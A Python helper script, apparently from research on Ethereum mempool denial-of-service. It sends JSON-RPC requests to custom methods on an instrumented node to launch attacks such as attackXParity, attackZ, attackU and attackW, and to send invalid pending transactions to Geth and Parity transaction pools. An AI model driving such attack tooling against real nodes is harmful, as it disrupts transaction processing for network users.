#! /usr/local/bin/python3
import sys
import os
import time, _thread
import web3
from web3 import Web3
import requests
import json

def deleteAllA(url):
    body = {"jsonrpc":"2.0","method":"eth_deleteAllA","params":[],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def setNodeA(url, addr, add=True):
    body={}
    if add:
        body = {"jsonrpc":"2.0","method":"eth_setNodeA","params":[addr],"id":67} 
    else:
        body = {"jsonrpc":"2.0","method":"eth_setNodeA","params":[addr, "false"],"id":67} 
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def setNodeB(url, addr):
    body = {'jsonrpc':'2.0','method':'eth_setNodeB','params':[addr],'id':67}
    body = json.dumps(body)
    body = str(body)
    output = requests.post(url, data = body, headers = {"Content-Type": "application/json"}).text
    if "error" in output:
            return False
    return True

def startAttack(url, addr, future_size, price, duration, interval, rate):
    body = {"jsonrpc":"2.0","method":"eth_startAttack", "params":[addr, future_size, 10002, price, duration, interval, rate],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def startValidate(url):
    body = {'jsonrpc':'2.0','method':'eth_startValidate','params':[],'id':67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def stopValidate(url):
    body = {'jsonrpc':'2.0','method':'eth_stopValidate','params':[],'id':67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def sendInvalid(url, addrs, faddrs, receiver, values, nonces, pending_size, future_size, price):
    body = {"jsonrpc":"2.0","method":"eth_sendInvalidPending", "params":[addrs, faddrs, receiver, values, nonces, pending_size, future_size, price],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def sendAttackBase(url, addrs, receiver, values, nonces, gases, price):
    body = {"jsonrpc":"2.0","method":"eth_attackBaseline", "params":[addrs, receiver, values, nonces, gases, price],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def attackXParity(url, addrs, future_size, price, duration, interval, rate):
    body = {"jsonrpc":"2.0","method":"eth_attackXParity", "params":[addrs, future_size, 1, price, duration, interval, rate],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def sendInvalidParity(url, addrs, recv, values, nonces, pending_size, price, rounds, senders_per_round):
    body = {"jsonrpc":"2.0","method":"eth_sendInvalidPendingParity", "params":[addrs, recv, values, nonces, pending_size, price, rounds, senders_per_round],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def sendTxs(url, addrs, receivers, values, nonces, gases, prices):
    body = {"jsonrpc":"2.0","method":"eth_sendTxs", "params":[addrs, receivers, values, nonces, gases, prices],"id":67}
    body = json.dumps(body)
    body = str(body)
    response = requests.post(url, data = body, headers = {"Content-Type": "application/json"})
    result = response.json().get('result')
    return result

def ClearPool(url):
    body = {"jsonrpc":"2.0","method":"eth_clearTxpool", "id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def CheckTxinpool(url,hash1):
    body = {"jsonrpc":"2.0","method":"eth_checkTxinpool", "params": [hash1],"id":67}
    body = json.dumps(body)
    body = str(body)
    response =  requests.post(url, data = body, headers = {"Content-Type": "application/json"})
    result = response.json().get('result')
    return result

def attackT(url, addrs, receivers, values, nonces, gases, prices, times):
    body = {"jsonrpc":"2.0","method":"eth_attackT", "params":[addrs, receivers, values, nonces, gases, prices, times],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def attackZ(url, addrs, faddrs, receiver, values, nonces, pending_size, future_size, price):
    body = {"jsonrpc":"2.0","method":"eth_attackZ", "params":[addrs, faddrs, receiver, values, nonces, pending_size, future_size, price],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def attackU(url, senders, receivers, values, nonces, gases, prices, p_size, f_size, duration, interval, rate):
    body = {"jsonrpc":"2.0","method":"eth_startAttackU", "params":[senders, receivers, values, nonces, gases, prices, p_size, f_size, duration, interval, rate],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})

def attackW(url, fsenders, senders, receiver, values, nonces, f_size, p_size, price, replace_price):
    body = {"jsonrpc":"2.0","method":"eth_attackW", "params":[fsenders, senders, receiver, values, nonces, f_size, p_size, price, replace_price],"id":67}
    body = json.dumps(body)
    body = str(body)
    return requests.post(url, data = body, headers = {"Content-Type": "application/json"})
